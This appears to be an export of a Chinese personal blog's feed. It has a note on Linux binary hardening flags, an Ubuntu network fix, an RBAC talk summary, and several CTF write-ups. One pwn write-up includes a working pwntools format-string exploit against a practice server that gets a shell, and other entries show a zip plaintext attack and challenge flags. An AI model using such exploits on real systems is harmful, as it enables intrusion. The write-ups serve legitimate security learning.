title="PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考Gcc和Open64中的-fPIC选项."></a>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考Gcc和Open64中的-fPIC选项.</h3><h3 id="gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表-Global-Offset-Table-中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项-注意，动态装载器操作系统的一部分，连接器是GCC的一部分-。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。"><a href="#gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表-Global-Offset-Table-中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项-注意，动态装载器操作系统的一部分，连接器是GCC的一部分-。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。" class="headerlink" title="gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。"></a>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</h3><h3 id="gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc-fpie-pie来编译程序。单独使用哪一个都无法达到效果。"><a href="#gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc-fpie-pie来编译程序。单独使用哪一个都无法达到效果。" class="headerlink" title="gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。"></a>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</h3><h2 id="·RELRO"><a href="#·RELRO" class="headerlink" title="·RELRO"></a>·RELRO</h2><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，是Partial RELRO </span><br><span class="line">gcc -z norelro -o test test.c // 关闭，即No RELRO </span><br><span class="line">gcc -z lazy -o test test.c // 部分开启，即Partial RELRO </span><br><span class="line">gcc -z now -o test test.c // 全部开启</span><br></pre></td></tr></tbody></table></figure></div><h2 id="·总结"><a href="#·总结" class="headerlink" title="·总结"></a>·总结</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NX：-z execstack / -z noexecstack (关闭 / 开启) </span><br><span class="line">Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) </span><br><span class="line">PIE：-no-pie / -pie (关闭 / 开启) RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</span><br></pre></td></tr></tbody></table></figure></div><h1 id="只开启NX"><a href="#只开启NX" class="headerlink" title="只开启NX"></a>只开启NX</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z norelro name code.c -o name</span><br></pre></td></tr></tbody></table></figure></div><h1 id="关闭所有保护"><a href="#关闭所有保护" class="headerlink" title="关闭所有保护"></a>关闭所有保护</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -z norelro -z execstack code.c -o name</span><br></pre></td></tr></tbody></table></figure></div><h1 id="开启所有保护"><a href="#开启所有保护" class="headerlink" title="开启所有保护"></a>开启所有保护</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc example.c -o example -z noexecstack -z now -fstack-protector-all -fPIE -pie</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu-突然无法联网</title>
      <link href="/2018/12/23/Ubuntu-%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/"/>
      <url>/2018/12/23/Ubuntu-%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Ubuntu突然无法联网，且右上方没有网络标志"><a href="#Ubuntu突然无法联网，且右上方没有网络标志" class="headerlink" title="Ubuntu突然无法联网，且右上方没有网络标志"></a>Ubuntu突然无法联网，且右上方没有网络标志</h2><h1 id="可以使用以下代码进行修复"><a href="#可以使用以下代码进行修复" class="headerlink" title="可以使用以下代码进行修复"></a>可以使用以下代码进行修复</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service network-manager stop</span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state </span><br><span class="line">sudo service network-manager start</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 常识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-安恒杯-18年12月赛-Misc3</title>
      <link href="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/"/>
      <url>/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="下载文件附件-rar"><a href="#下载文件附件-rar" class="headerlink" title="下载文件附件.rar"></a>下载文件<a href="附件.rar">附件.rar</a></h2><h1 id="解压后发现-备忘录-txt-在-只要学不死就往死里学-zip-的也有同样的文件，且CRC效验值相同，于是我们可以使用明文攻击解出压缩包密码"><a href="#解压后发现-备忘录-txt-在-只要学不死就往死里学-zip-的也有同样的文件，且CRC效验值相同，于是我们可以使用明文攻击解出压缩包密码" class="headerlink" title="解压后发现 备忘录.txt 在 只要学不死就往死里学.zip 的也有同样的文件，且CRC效验值相同，于是我们可以使用明文攻击解出压缩包密码"></a>解压后发现 备忘录.txt 在 只要学不死就往死里学.zip 的也有同样的文件，且CRC效验值相同，于是我们可以使用明文攻击解出压缩包密码</h1><h1 id="此时我们需要-ARCHPR，我这里使用4-54版本，载入ZIP，然后-攻击类型-为-明文"><a href="#此时我们需要-ARCHPR，我这里使用4-54版本，载入ZIP，然后-攻击类型-为-明文" class="headerlink" title="此时我们需要 ARCHPR，我这里使用4.54版本，载入ZIP，然后 攻击类型 为 明文"></a>此时我们需要 ARCHPR，我这里使用4.54版本，载入ZIP，然后 攻击类型 为 明文</h1><p><a href="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/1.png" class="lazyload"></a></p><h1 id="然后我们将-备忘录-txt-压缩成-zip压缩包！注意是zip压缩包，别压成rar了！"><a href="#然后我们将-备忘录-txt-压缩成-zip压缩包！注意是zip压缩包，别压成rar了！" class="headerlink" title="然后我们将 备忘录.txt 压缩成 zip压缩包！注意是zip压缩包，别压成rar了！"></a>然后我们将 备忘录.txt 压缩成 zip压缩包！注意是zip压缩包，别压成rar了！</h1><h1 id="然后我们选明文文件路径为-备忘录-zip"><a href="#然后我们选明文文件路径为-备忘录-zip" class="headerlink" title="然后我们选明文文件路径为 备忘录.zip"></a>然后我们选明文文件路径为 备忘录.zip</h1><p><a href="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/2.png" class="lazyload"></a></p><h1 id="点击开始恢复"><a href="#点击开始恢复" class="headerlink" title="点击开始恢复"></a>点击开始恢复</h1><p><a href="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/3.png" class="lazyload"></a></p><h1 id="等待几分钟，便可以得到答案"><a href="#等待几分钟，便可以得到答案" class="headerlink" title="等待几分钟，便可以得到答案"></a>等待几分钟，便可以得到答案</h1><p><a href="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/4.png" class="lazyload"></a></p><h2 id="压缩包密码：1qazmko098"><a href="#压缩包密码：1qazmko098" class="headerlink" title="压缩包密码：1qazmko098"></a>压缩包密码：1qazmko098</h2><h1 id="然后解开-只要学不死就往死里学-zip"><a href="#然后解开-只要学不死就往死里学-zip" class="headerlink" title="然后解开 只要学不死就往死里学.zip"></a>然后解开 只要学不死就往死里学.zip</h1><h1 id="打开-学习资料-docx-结果发现没有东西"><a href="#打开-学习资料-docx-结果发现没有东西" class="headerlink" title="打开 学习资料 - .docx 结果发现没有东西"></a>打开 学习资料 - .docx 结果发现没有东西</h1><h1 id="其实docx本质是压缩包文件，我们可以将docx解压然后查看里面的文件，文本的数据一般存在word-document-xml中"><a href="#其实docx本质是压缩包文件，我们可以将docx解压然后查看里面的文件，文本的数据一般存在word-document-xml中" class="headerlink" title="其实docx本质是压缩包文件，我们可以将docx解压然后查看里面的文件，文本的数据一般存在word/document.xml中"></a>其实docx本质是压缩包文件，我们可以将docx解压然后查看里面的文件，文本的数据一般存在word/document.xml中</h1><p><a href="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/22/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-18%E5%B9%B412%E6%9C%88%E8%B5%9B-Misc3/5.png" class="lazyload"></a></p><h1 id="取出标记语言后，得到flag"><a href="#取出标记语言后，得到flag" class="headerlink" title="取出标记语言后，得到flag"></a>取出标记语言后，得到flag</h1><h2 id="flag-edaa144c91a4e5b817e4a18cbdb78879"><a href="#flag-edaa144c91a4e5b817e4a18cbdb78879" class="headerlink" title="flag{edaa144c91a4e5b817e4a18cbdb78879}"></a>flag{edaa144c91a4e5b817e4a18cbdb78879}</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
            <tag> MISC </tag>
            
            <tag> 安恒杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BetaHouse-令人迷恋的权限</title>
      <link href="/2018/12/16/BetaHouse-%E4%BB%A4%E4%BA%BA%E8%BF%B7%E6%81%8B%E7%9A%84%E6%9D%83%E9%99%90/"/>
      <url>/2018/12/16/BetaHouse-%E4%BB%A4%E4%BA%BA%E8%BF%B7%E6%81%8B%E7%9A%84%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="我学校里的BetaHouse分享会，会定期分享一些知识"><a href="#我学校里的BetaHouse分享会，会定期分享一些知识" class="headerlink" title="我学校里的BetaHouse分享会，会定期分享一些知识"></a>我学校里的BetaHouse分享会，会定期分享一些知识</h2><h1 id="令人迷恋的权限"><a href="#令人迷恋的权限" class="headerlink" title="令人迷恋的权限"></a>令人迷恋的权限</h1><p><a href="/2018/12/16/BetaHouse-%E4%BB%A4%E4%BA%BA%E8%BF%B7%E6%81%8B%E7%9A%84%E6%9D%83%E9%99%90/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/16/BetaHouse-%E4%BB%A4%E4%BA%BA%E8%BF%B7%E6%81%8B%E7%9A%84%E6%9D%83%E9%99%90/1.png" class="lazyload"></a><br>一、什么是权限<br>二、Oauth2.0标准<br>    Oauth2.0是一套正式的互联网标准<br>    在客户端与服务提供商之间设置一个授权层<br>    客户端只能登录授权层，<br>三、RBAC权限模型<br>    基于角色的权限访问控制（Role-Based Access Control）<br>    1、RBAC96模型<br>        a)基本模型RBAC0模型<br>        b)角色分级模型RBAC1<br>        c)限制模型RBAC2（引入互斥，比如当老师的同时不能当学生）<br>        d)统一模型RBAC3（整合了RBAC1和RBAC2）<br>        e)其他：ARBAC97模型    DRBAC（动态结盟环境下的分布式RBAC模型）</p><p>总体雷同于论坛中游客、用户、VIP、版主、GM这样的机制</p></body></html>]]></content>
      
      
      <categories>
          
          <category> Betahouse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Betahouse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Pwn-[61dctf]fm</title>
      <link href="/2018/12/12/CTF-JarvisOJ-Pwn-%5B61dctf%5Dfm/"/>
      <url>/2018/12/12/CTF-JarvisOJ-Pwn-%5B61dctf%5Dfm/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="文件下载fm"><a href="#文件下载fm" class="headerlink" title="文件下载fm"></a>文件下载<a href="fm">fm</a></h2><h1 id="导入IDA，查看伪代码"><a href="#导入IDA，查看伪代码" class="headerlink" title="导入IDA，查看伪代码"></a>导入IDA，查看伪代码</h1><p><a href="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/1.png" class="lazyload"></a></p><h2 id="发现需要修改x的值就可以拿到shell，且发现printf-amp-buf-存在漏洞"><a href="#发现需要修改x的值就可以拿到shell，且发现printf-amp-buf-存在漏洞" class="headerlink" title="发现需要修改x的值就可以拿到shell，且发现printf(&buf)存在漏洞"></a>发现需要修改x的值就可以拿到shell，且发现printf(&buf)存在漏洞</h2><h2 id="且x的地址为0x0804A02C"><a href="#且x的地址为0x0804A02C" class="headerlink" title="且x的地址为0x0804A02C"></a>且x的地址为0x0804A02C</h2><h2 id="这里需要补充一个额外知识，printf-x-address-”-c-n”-可以修改-x-address-的值为x-address的字符长度"><a href="#这里需要补充一个额外知识，printf-x-address-”-c-n”-可以修改-x-address-的值为x-address的字符长度" class="headerlink" title="这里需要补充一个额外知识，printf(x_address+”%c$n”)可以修改[x_address]的值为x_address的字符长度"></a>这里需要补充一个额外知识，printf(x_address+”%c$n”)可以修改[x_address]的值为x_address的字符长度</h2><h2 id="x-address在32位程序中当然是4个字节的，所以我们需要找到偏移c是多少。"><a href="#x-address在32位程序中当然是4个字节的，所以我们需要找到偏移c是多少。" class="headerlink" title="x_address在32位程序中当然是4个字节的，所以我们需要找到偏移c是多少。"></a>x_address在32位程序中当然是4个字节的，所以我们需要找到偏移c是多少。</h2><h2 id="可使用printf-x-address-”-p-p-p-p-p-p-p-p-p-p-p-p-p”-，-p的次数按照具体实际定，只需要找到偏移量就可以了"><a href="#可使用printf-x-address-”-p-p-p-p-p-p-p-p-p-p-p-p-p”-，-p的次数按照具体实际定，只需要找到偏移量就可以了" class="headerlink" title="可使用printf(x_address+”%p%p%p%p%p%p%p%p%p%p%p%p%p”)，%p的次数按照具体实际定，只需要找到偏移量就可以了"></a>可使用printf(x_address+”%p%p%p%p%p%p%p%p%p%p%p%p%p”)，%p的次数按照具体实际定，只需要找到偏移量就可以了</h2><h2 id="这道题本身就是很碰巧的，x-address恰好是四字节刚好符合x-4的条件，如果是其他数值的话，还需要另外考虑了"><a href="#这道题本身就是很碰巧的，x-address恰好是四字节刚好符合x-4的条件，如果是其他数值的话，还需要另外考虑了" class="headerlink" title="这道题本身就是很碰巧的，x_address恰好是四字节刚好符合x==4的条件，如果是其他数值的话，还需要另外考虑了"></a>这道题本身就是很碰巧的，x_address恰好是四字节刚好符合x==4的条件，如果是其他数值的话，还需要另外考虑了</h2><p><a href="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/2.png" class="lazyload"></a></p><h2 id="发现偏移，可以根据0x和nil的数量判断偏移位置，在此偏移为11"><a href="#发现偏移，可以根据0x和nil的数量判断偏移位置，在此偏移为11" class="headerlink" title="发现偏移，可以根据0x和nil的数量判断偏移位置，在此偏移为11"></a>发现偏移，可以根据0x和nil的数量判断偏移位置，在此偏移为11</h2><h2 id="所以我们只需要写入printf-x-address-”-11-n”-便可以拿到shell"><a href="#所以我们只需要写入printf-x-address-”-11-n”-便可以拿到shell" class="headerlink" title="所以我们只需要写入printf(x_address+”%11$n”)便可以拿到shell"></a>所以我们只需要写入printf(x_address+”%11$n”)便可以拿到shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("pwn2.jarvisoj.com",9895)</span><br><span class="line">#sh = process("./fm")</span><br><span class="line">payload = p32(0x0804A02C)+'%11$n'</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><a href="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/3.png" class="lazyload"></a></p><h2 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h2><p><a href="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/12/CTF-JarvisOJ-Pwn-[61dctf]fm/4.png" class="lazyload"></a></p><h1 id="CTF-ba13fcc2ce152bd3cc0fbba6a22d46b6"><a href="#CTF-ba13fcc2ce152bd3cc0fbba6a22d46b6" class="headerlink" title="CTF{ba13fcc2ce152bd3cc0fbba6a22d46b6}"></a>CTF{ba13fcc2ce152bd3cc0fbba6a22d46b6}</h1></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Crypto-[61dctf]bbencode</title>
      <link href="/2018/12/11/CTF-JarvisOJ-Crypto-%5B61dctf%5Dbbencode/"/>
      <url>/2018/12/11/CTF-JarvisOJ-Crypto-%5B61dctf%5Dbbencode/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = open("flag", "r").read().strip()</span><br><span class="line">assert len(flag) == 32</span><br><span class="line">def str2num(s):</span><br><span class="line">    return int(s.encode('hex'), 16)</span><br><span class="line">def bbencode(n):</span><br><span class="line">    a = 0</span><br><span class="line">    for i in bin(n)[2:]:</span><br><span class="line">        a = a << 1</span><br><span class="line">        if (int(i)):</span><br><span class="line">            a = a ^ n</span><br><span class="line">        if a >> 256:</span><br><span class="line">            a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L</span><br><span class="line">    return a</span><br><span class="line">print bbencode(str2num(flag))</span><br><span class="line">result:61406787709715709430385495960238216763226399960658358000016620560764164045692</span><br></pre></td></tr></tbody></table></figure></div><h1 id="由于异或本身是可逆运算，且分析算法可知每位异或的值还是一样的，所以直接用bbencode函数再异或一次，就可以逆回原码"><a href="#由于异或本身是可逆运算，且分析算法可知每位异或的值还是一样的，所以直接用bbencode函数再异或一次，就可以逆回原码" class="headerlink" title="由于异或本身是可逆运算，且分析算法可知每位异或的值还是一样的，所以直接用bbencode函数再异或一次，就可以逆回原码"></a>由于异或本身是可逆运算，且分析算法可知每位异或的值还是一样的，所以直接用bbencode函数再异或一次，就可以逆回原码</h1><h1 id="python代码如下"><a href="#python代码如下" class="headerlink" title="python代码如下"></a>python代码如下</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def bbencode(n):</span><br><span class="line">    a = 0</span><br><span class="line">    for i in bin(n)[2:]:</span><br><span class="line">        a = a << 1</span><br><span class="line">        if (int(i)):</span><br><span class="line">            a = a ^ n</span><br><span class="line">        if a >> 256:</span><br><span class="line">            a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L</span><br><span class="line">    return a</span><br><span class="line">result = 61406787709715709430385495960238216763226399960658358000016620560764164045692</span><br><span class="line">for i in range(10000):</span><br><span class="line">    result = bbencode(result)</span><br><span class="line">    if("666c6167" == str(hex(result))[2:10]):</span><br><span class="line">        print i</span><br><span class="line">        print hex(result)[2:-1].decode('hex')</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Web-Secret</title>
      <link href="/2018/12/11/CTF-JarvisOJ-Web-Secret/"/>
      <url>/2018/12/11/CTF-JarvisOJ-Web-Secret/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h4 id="传说中的签到题"><a href="#传说中的签到题" class="headerlink" title="传说中的签到题"></a>传说中的签到题</h4><h4 id="题目入口：http-web-jarvisoj-com-32776"><a href="#题目入口：http-web-jarvisoj-com-32776" class="headerlink" title="题目入口：http://web.jarvisoj.com:32776/"></a>题目入口：<a href="http://web.jarvisoj.com:32776/" target="_blank" rel="noopener">http://web.jarvisoj.com:32776/</a></h4><h4 id="Hint1-提交格式PCTF-你发现的秘密"><a href="#Hint1-提交格式PCTF-你发现的秘密" class="headerlink" title="Hint1: 提交格式PCTF{你发现的秘密}"></a>Hint1: 提交格式PCTF{你发现的秘密}</h4><h2 id="打开网页，然后F12开启工具箱"><a href="#打开网页，然后F12开启工具箱" class="headerlink" title="打开网页，然后F12开启工具箱"></a>打开网页，然后F12开启工具箱</h2><p><a href="/2018/12/11/CTF-JarvisOJ-Web-Secret/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/12/11/CTF-JarvisOJ-Web-Secret/1.png" class="lazyload"></a></p><h2 id="发现标头有Secret-Welcome-to-phrackCTF-2016"><a href="#发现标头有Secret-Welcome-to-phrackCTF-2016" class="headerlink" title="发现标头有Secret: Welcome_to_phrackCTF_2016"></a>发现标头有Secret: Welcome_to_phrackCTF_2016</h2><h2 id="PCTF-Welcome-to-phrackCTF-2016"><a href="#PCTF-Welcome-to-phrackCTF-2016" class="headerlink" title="PCTF{Welcome_to_phrackCTF_2016}"></a>PCTF{Welcome_to_phrackCTF_2016}</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-Base64</title>
      <link href="/2018/12/08/CTF-JarvisOJ-Basic-Base64/"/>
      <url>/2018/12/08/CTF-JarvisOJ-Basic-Base64/</url>
      
